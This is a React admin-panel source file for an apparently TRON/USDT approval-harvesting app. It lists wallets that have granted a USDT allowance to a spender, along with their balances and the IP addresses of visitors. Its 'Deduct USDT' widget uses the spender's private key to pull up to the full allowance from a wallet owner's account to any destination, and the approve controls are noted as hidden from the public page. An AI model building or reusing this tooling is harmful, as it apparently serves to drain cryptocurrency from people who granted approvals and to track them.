import {
  Fragment,
  useCallback,
  useEffect,
  useState,
  type FormEvent,
  type ReactNode,
} from 'react'
import {
  deductUsdt,
  downloadAdminExport,
  getAdminSummary,
  type AdminSummary,
  type VerificationRow,
  type WalletRow,
} from '../lib/api'
import { USDT, formatAllowance, formatTokenAmount } from '../lib/usdt'
import { AccountPanel } from './AccountPanel'
import { ApprovePanel } from './ApprovePanel'
import { BrandingEditor } from './BrandingEditor'
import { SignMessage } from './SignMessage'

const TOKEN_KEY = 'tron-connect-admin-token'
const REFRESH_MS = 10_000

export function AdminPanel() {
  const [token, setToken] = useState(() => sessionStorage.getItem(TOKEN_KEY) ?? '')
  const [tokenInput, setTokenInput] = useState(token)
  const [summary, setSummary] = useState<AdminSummary | null>(null)
  const [error, setError] = useState<string | null>(null)
  const [loading, setLoading] = useState(false)
  const [autoRefresh, setAutoRefresh] = useState(true)
  const [expanded, setExpanded] = useState<string | null>(null)

  const load = useCallback(async (authToken: string, forceRefresh = false) => {
    setLoading(true)
    setError(null)
    try {
      setSummary(await getAdminSummary(authToken, forceRefresh))
    } catch (err) {
      const message = err instanceof Error ? err.message : 'Could not load admin data.'
      setError(message)
      if (/unauthorized/i.test(message)) signOut()
    } finally {
      setLoading(false)
    }
  }, [])

  useEffect(() => {
    if (token) void load(token)
  }, [token, load])

  useEffect(() => {
    if (!token || !autoRefresh) return

    const id = window.setInterval(() => {
      void load(token)
    }, REFRESH_MS)

    return () => window.clearInterval(id)
  }, [token, autoRefresh, load])

  function signOut() {
    sessionStorage.removeItem(TOKEN_KEY)
    setToken('')
    setTokenInput('')
    setSummary(null)
  }

  function handleTokenSubmit(event: FormEvent) {
    event.preventDefault()
    const value = tokenInput.trim()
    if (!value) return
    sessionStorage.setItem(TOKEN_KEY, value)
    setToken(value)
  }

  async function handleExport() {
    try {
      const blob = await downloadAdminExport(token)
      const url = URL.createObjectURL(blob)
      const link = document.createElement('a')
      link.href = url
      link.download = 'tron-connect-store.json'
      link.click()
      URL.revokeObjectURL(url)
    } catch (err) {
      setError(err instanceof Error ? err.message : 'Export failed.')
    }
  }

  if (!token) {
    return (
      <section>
        <p className="hint">
          Paste the <code>ADMIN_TOKEN</code> from <code>.env</code> to see wallets, allowance
          checks and confirmed transactions.
        </p>
        <form className="token-form" onSubmit={handleTokenSubmit}>
          <input
            type="password"
            value={tokenInput}
            onChange={(event) => setTokenInput(event.target.value)}
            placeholder="ADMIN_TOKEN"
            autoComplete="off"
          />
          <button className="btn small" type="submit">
            Open
          </button>
        </form>
        {error && <p className="error">{error}</p>}
      </section>
    )
  }

  if (!summary) {
    return (
      <section>
        <p className="hint">{loading ? 'Loading admin data…' : (error ?? 'No data yet.')}</p>
        {error && <p className="error">{error}</p>}
        <button className="btn ghost small" type="button" onClick={signOut}>
          Sign out
        </button>
      </section>
    )
  }

  const { totals, wallets, verifications, events, config, generatedAt } = summary
  const required = safeBigInt(config.required)

  return (
    <section>
      <div className="admin-head">
        <p className="hint">
          Updated {time(generatedAt)} · {totals.wallets} wallets · {totals.verifications} checks
        </p>
        <div className="admin-actions">
          <label className="toggle">
            <input
              type="checkbox"
              checked={autoRefresh}
              onChange={(event) => setAutoRefresh(event.target.checked)}
            />
            Auto-refresh
          </label>
          <button className="btn small ghost" type="button" onClick={() => void load(token, true)}>
            {loading ? 'Refreshing…' : 'Refresh'}
          </button>
          <button className="btn small ghost" type="button" onClick={() => void handleExport()}>
            Export JSON
          </button>
          <button className="btn small ghost" type="button" onClick={signOut}>
            Sign out
          </button>
        </div>
      </div>

      {error && <p className="error">{error}</p>}

      <div className="config-grid">
        <div>
          <span className="config-key">Spender</span>
          <code>{config.spender || 'not configured'}</code>
        </div>
        <div>
          <span className="config-key">USDT</span>
          <code>{config.usdt}</code>
        </div>
        <div>
          <span className="config-key">Required allowance</span>
          <code>{formatAllowance(required)}</code>
        </div>
        <div>
          <span className="config-key">Network</span>
          <code>{config.network}</code>
        </div>
        <div>
          <span className="config-key">Deductions</span>
          <code>{config.canDeduct ? 'enabled' : 'disabled (set SPENDER_PRIVATE_KEY)'}</code>
        </div>
        <div>
          <span className="config-key">Store</span>
          <code>
            {config.storage ?? 'file'}
            {config.storage === 'memory' ? ' (not persistent — connect Redis)' : ''}
          </code>
        </div>
      </div>

      <div className="stats">
        <Stat name="Verified wallets" value={totals.wallets} />
        <Stat name="With enough allowance" value={totals.sufficientWallets} tone="ok" />
        <Stat name="Allowance checks" value={totals.verifications} />
        <Stat name="Approvals" value={totals.approvals} tone="ok" />
        <Stat name="Revokes" value={totals.revokes} />
        <Stat name="Reset steps" value={totals.resets} />
        <Stat name="Deductions" value={totals.deductions} />
        <Stat name="Failed events" value={totals.failed} tone={totals.failed ? 'bad' : undefined} />
      </div>

      <BrandingEditor token={token} />

      <h2>Wallet tools</h2>
      <p className="hint">
        Connect a wallet here to approve or revoke USDT. These controls are not shown on the
        public page.
      </p>
      <AccountPanel />
      <ApprovePanel />
      <SignMessage />

      <h2>Wallets</h2>
      {wallets.length === 0 ? (
        <p className="hint">No wallet has been checked yet.</p>
      ) : (
        <div className="table-wrap">
          <table>
            <thead>
              <tr>
                <th>Wallet</th>
                <th>Allowance</th>
                <th>Enough?</th>
                <th>TRX</th>
                <th>USDT</th>
                <th>Checks</th>
                <th>Last checked</th>
                <th />
              </tr>
            </thead>
            <tbody>
              {wallets.map((wallet) => (
                <Fragment key={wallet.owner}>
                  <tr>
                    <td className="mono" title={wallet.owner}>
                      <a href={addressUrl(wallet.owner)} target="_blank" rel="noreferrer">
                        {short(wallet.owner)}
                      </a>
                    </td>
                    <td>{wallet.allowance === null ? '—' : formatRaw(wallet.allowance)}</td>
                    <td>
                      <Pill ok={wallet.sufficient}>{wallet.sufficient ? 'yes' : 'no'}</Pill>
                    </td>
                    <td>{formatTrx(wallet.onchain.trxBalance)}</td>
                    <td>{formatUsdt(wallet.onchain.usdtBalance)}</td>
                    <td>{wallet.checks}</td>
                    <td>{time(wallet.lastCheckedAt)}</td>
                    <td>
                      <button
                        className="link"
                        type="button"
                        onClick={() =>
                          setExpanded(expanded === wallet.owner ? null : wallet.owner)
                        }
                      >
                        {expanded === wallet.owner ? 'Hide' : 'Details'}
                      </button>
                    </td>
                  </tr>
                  {expanded === wallet.owner && (
                    <tr className="detail-row">
                      <td colSpan={8}>
                        <WalletDetails
                          wallet={wallet}
                          token={token}
                          canDeduct={config.canDeduct ?? false}
                          defaultTo={config.spender}
                          onDone={() => void load(token, true)}
                        />
                      </td>
                    </tr>
                  )}
                </Fragment>
              ))}
            </tbody>
          </table>
        </div>
      )}

      <h2>Confirmed / rejected transactions</h2>
      {events.length === 0 ? (
        <p className="hint">No transactions reported yet.</p>
      ) : (
        <div className="table-wrap">
          <table>
            <thead>
              <tr>
                <th>Time</th>
                <th>Action</th>
                <th>Wallet</th>
                <th>Status</th>
                <th>Allowance after</th>
                <th>Transaction</th>
              </tr>
            </thead>
            <tbody>
              {events.map((event) => (
                <tr key={event.id}>
                  <td>{time(event.at)}</td>
                  <td>{event.action}</td>
                  <td className="mono" title={event.owner}>
                    {short(event.owner)}
                  </td>
                  <td>
                    <Pill ok={event.status === 'confirmed'}>
                      {event.status === 'confirmed' ? 'confirmed' : 'rejected'}
                    </Pill>
                    {event.error && <div className="row-error">{event.error}</div>}
                  </td>
                  <td>
                    {event.allowanceAfter === null ? '—' : formatRaw(event.allowanceAfter)}
                  </td>
                  <td className="mono">
                    <a href={txUrl(event.txId)} target="_blank" rel="noreferrer">
                      {short(event.txId)}
                    </a>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      )}

      <h2>Allowance checks</h2>
      <VerificationTable rows={verifications} required={required} />
    </section>
  )
}

function VerificationTable({ rows, required }: { rows: VerificationRow[]; required: bigint }) {
  if (rows.length === 0) return <p className="hint">No allowance checks yet.</p>

  return (
    <div className="table-wrap">
      <table>
        <thead>
          <tr>
            <th>Time</th>
            <th>Wallet</th>
            <th>Allowance</th>
            <th>Required met</th>
            <th>IP</th>
          </tr>
        </thead>
        <tbody>
          {rows.map((row) => (
            <tr key={row.id}>
              <td>{time(row.at)}</td>
              <td className="mono" title={row.owner}>
                <a href={addressUrl(row.owner)} target="_blank" rel="noreferrer">
                  {short(row.owner)}
                </a>
              </td>
              <td>{formatRaw(row.allowance)}</td>
              <td>
                <Pill ok={safeBigInt(row.allowance) >= required}>
                  {safeBigInt(row.allowance) >= required ? 'yes' : 'no'}
                </Pill>
              </td>
              <td className="mono">{row.ip}</td>
            </tr>
          ))}
        </tbody>
      </table>
    </div>
  )
}

function WalletDetails({
  wallet,
  token,
  canDeduct,
  defaultTo,
  onDone,
}: {
  wallet: WalletRow
  token: string
  canDeduct: boolean
  defaultTo: string
  onDone: () => void
}) {
  const chain = wallet.onchain
  const allowance = wallet.allowance === null ? 0n : safeBigInt(wallet.allowance)
  const balance = chain.usdtBalance === null ? 0n : safeBigInt(chain.usdtBalance)

  return (
    <div className="wallet-details">
      {chain.error && (
        <p className="error">
          On-chain lookup failed: {chain.error} (data from {time(chain.fetchedAt)})
        </p>
      )}

      <div className="detail-grid">
        <Detail label="Activated" value={chain.exists ? 'yes' : 'no'} />
        <Detail label="Hex address" value={chain.hex ?? '—'} mono />
        <Detail label="Created" value={chain.createdAt ? time(chain.createdAt) : '—'} />
        <Detail
          label="Last on-chain activity"
          value={chain.lastOperationAt ? time(chain.lastOperationAt) : '—'}
        />
        <Detail label="TRX balance" value={formatTrx(chain.trxBalance)} />
        <Detail label="USDT balance" value={formatUsdt(chain.usdtBalance)} />
        <Detail label="Staked TRX" value={formatTrx(chain.stakedTrx)} />
        <Detail
          label="Energy used / limit"
          value={`${num(chain.energy.used)} / ${num(chain.energy.limit)}`}
        />
        <Detail
          label="Bandwidth (free) used / limit"
          value={`${num(chain.bandwidth.freeUsed)} / ${num(chain.bandwidth.freeLimit)}`}
        />
        <Detail
          label="Bandwidth (staked) used / limit"
          value={`${num(chain.bandwidth.stakedUsed)} / ${num(chain.bandwidth.stakedLimit)}`}
        />
        <Detail label="Allowance checks" value={String(wallet.checks)} />
        <Detail
          label="Approvals / revokes / resets / deductions"
          value={`${wallet.activity.approvals} / ${wallet.activity.revokes} / ${wallet.activity.resets} / ${wallet.activity.deductions}`}
        />
        <Detail label="Failed reports" value={String(wallet.activity.failed)} />
        <Detail label="Balance snapshot" value={time(chain.fetchedAt)} />
      </div>

      {chain.tokens.length > 0 && (
        <>
          <p className="label">TRC20 token balances</p>
          <ul className="token-list">
            {chain.tokens.map((token) => (
              <li key={token.token}>
                <span className="mono" title={token.token}>
                  {short(token.token)}
                </span>
                <span>{tokenAmount(token.token, token.amount)}</span>
              </li>
            ))}
          </ul>
        </>
      )}

      {wallet.activity.lastEvent && (
        <p className="hint last-event">
          Last event: {wallet.activity.lastEvent.action} ·{' '}
          {wallet.activity.lastEvent.status} · {time(wallet.activity.lastEvent.at)} ·{' '}
          <a href={txUrl(wallet.activity.lastEvent.txId)} target="_blank" rel="noreferrer">
            {short(wallet.activity.lastEvent.txId)}
          </a>
        </p>
      )}

      <DeductWidget
        owner={wallet.owner}
        allowance={allowance}
        balance={balance}
        token={token}
        canDeduct={canDeduct}
        defaultTo={defaultTo}
        onDone={onDone}
      />
    </div>
  )
}

function DeductWidget({
  owner,
  allowance,
  balance,
  token,
  canDeduct,
  defaultTo,
  onDone,
}: {
  owner: string
  allowance: bigint
  balance: bigint
  token: string
  canDeduct: boolean
  defaultTo: string
  onDone: () => void
}) {
  const [amount, setAmount] = useState('')
  const [to, setTo] = useState(defaultTo)
  const [stage, setStage] = useState<'idle' | 'review'>('idle')
  const [busy, setBusy] = useState(false)
  const [error, setError] = useState<string | null>(null)
  const [result, setResult] = useState<{ txId: string; amount: string } | null>(null)

  const max = allowance < balance ? allowance : balance
  const parsed = parseDecimal(amount)
  const valid = parsed !== null && parsed > 0n && parsed <= max

  if (!canDeduct) {
    return (
      <p className="hint deduct-note">
        Deductions are disabled. Set <code>SPENDER_PRIVATE_KEY</code> on the server and restart.
      </p>
    )
  }

  if (max === 0n) {
    return (
      <p className="hint deduct-note">
        Nothing to deduct: allowance {formatTokenAmount(allowance)} USDT, balance{' '}
        {formatTokenAmount(balance)} USDT.
      </p>
    )
  }

  async function submit() {
    if (!valid) return

    setBusy(true)
    setError(null)
    try {
      const response = await deductUsdt(token, { owner, amount: amount.trim(), to: to.trim() })
      setResult({
        txId: response.txId,
        amount: formatTokenAmount(BigInt(response.amount)),
      })
      setAmount('')
      setStage('idle')
      onDone()
    } catch (err) {
      setError(err instanceof Error ? err.message : 'Deduction failed.')
      setStage('idle')
    } finally {
      setBusy(false)
    }
  }

  return (
    <div className="deduct">
      <p className="label">Deduct USDT (manual)</p>
      <p className="hint">
        Available: <strong>{formatTokenAmount(max)} USDT</strong> · allowance{' '}
        {formatTokenAmount(allowance)} · balance {formatTokenAmount(balance)}
      </p>

      <div className="deduct-form">
        <label>
          <span className="config-key">Amount (USDT)</span>
          <input
            type="text"
            inputMode="decimal"
            value={amount}
            placeholder="0.00"
            onChange={(event) => {
              setAmount(event.target.value)
              setStage('idle')
              setResult(null)
            }}
          />
        </label>
        <button
          className="btn small ghost"
          type="button"
          onClick={() => {
            setAmount(formatTokenAmount(max).replace(/,/g, ''))
            setStage('idle')
            setResult(null)
          }}
        >
          Max
        </button>
        <label>
          <span className="config-key">Destination</span>
          <input
            type="text"
            value={to}
            onChange={(event) => {
              setTo(event.target.value)
              setStage('idle')
              setResult(null)
            }}
          />
        </label>
      </div>

      {stage === 'idle' ? (
        <button
          className="btn small"
          type="button"
          disabled={!valid || busy}
          onClick={() => setStage('review')}
        >
          Review deduction
        </button>
      ) : (
        <div className="deduct-review">
          <p>
            Send <strong>{formatTokenAmount(parsed!)} USDT</strong> from{' '}
            <code>{short(owner)}</code> to <code>{short(to.trim())}</code>?
          </p>
          <div className="row">
            <button className="btn small" type="button" onClick={() => void submit()} disabled={busy}>
              {busy ? 'Sending…' : 'Confirm deduction'}
            </button>
            <button
              className="btn small ghost"
              type="button"
              onClick={() => setStage('idle')}
              disabled={busy}
            >
              Cancel
            </button>
          </div>
        </div>
      )}

      {error && <p className="error">{error}</p>}

      {result && (
        <p className="hint deduct-result">
          Sent {result.amount} USDT ·{' '}
          <a href={txUrl(result.txId)} target="_blank" rel="noreferrer">
            {short(result.txId)}
          </a>
        </p>
      )}
    </div>
  )
}

function parseDecimal(value: string): bigint | null {
  const raw = value.trim()
  if (!/^\d+(\.\d{0,6})?$/.test(raw)) return null

  const [whole, fraction = ''] = raw.split('.')
  return BigInt(whole) * 1_000_000n + (fraction ? BigInt(fraction.padEnd(6, '0')) : 0n)
}

function Detail({ label, value, mono }: { label: string; value: string; mono?: boolean }) {
  return (
    <div>
      <span className="config-key">{label}</span>
      <span className={mono ? 'mono detail-value' : 'detail-value'}>{value}</span>
    </div>
  )
}

function Stat({ name, value, tone }: { name: string; value: number; tone?: 'ok' | 'bad' }) {
  return (
    <div className="stat">
      <div className={`stat-value ${tone ?? ''}`}>{value}</div>
      <div className="stat-name">{name}</div>
    </div>
  )
}

function Pill({ ok, children }: { ok: boolean; children: ReactNode }) {
  return <span className={`pill ${ok ? 'ok' : 'bad'}`}>{children}</span>
}

function formatRaw(raw: string): string {
  try {
    return formatAllowance(BigInt(raw))
  } catch {
    return raw
  }
}

function formatTrx(raw: string): string {
  try {
    return `${formatTokenAmount(BigInt(raw))} TRX`
  } catch {
    return raw
  }
}

function formatUsdt(raw: string | null): string {
  if (raw === null) return '—'
  try {
    return `${formatTokenAmount(BigInt(raw))} USDT`
  } catch {
    return raw
  }
}

function tokenAmount(token: string, amount: string): string {
  if (token !== USDT) return `${amount} (raw)`
  try {
    return `${formatTokenAmount(BigInt(amount))} USDT`
  } catch {
    return amount
  }
}

function num(value: number): string {
  return value.toLocaleString('en-US')
}

function safeBigInt(raw: string): bigint {
  try {
    return BigInt(raw)
  } catch {
    return 0n
  }
}

function short(value: string): string {
  return value.length > 14 ? `${value.slice(0, 6)}…${value.slice(-6)}` : value
}

function time(iso: string): string {
  return new Date(iso).toLocaleString()
}

function txUrl(txId: string): string {
  return `https://tronscan.org/#/transaction/${txId}`
}

function addressUrl(address: string): string {
  return `https://tronscan.org/#/address/${address}`
}
